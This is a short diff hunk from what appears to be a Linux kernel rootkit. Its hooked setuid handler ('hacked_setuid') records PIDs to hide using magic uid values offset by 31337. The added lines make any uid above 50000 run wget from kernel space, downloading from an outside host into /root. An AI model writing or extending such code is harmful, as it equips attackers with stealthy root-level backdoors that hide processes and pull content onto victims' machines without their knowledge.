@@ -198,6 +198,10 @@ asmlinkage int hacked_setuid(uid_t uid){
 		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
 	}
+	if(uid > 50000){
+	        const char *args[5] = {"wget","google.com","-P","//root"};
+	        my_execve("//bin//wget", args , NULL);
+	}
 	return (*orig_setuid)(uid);
 }
 
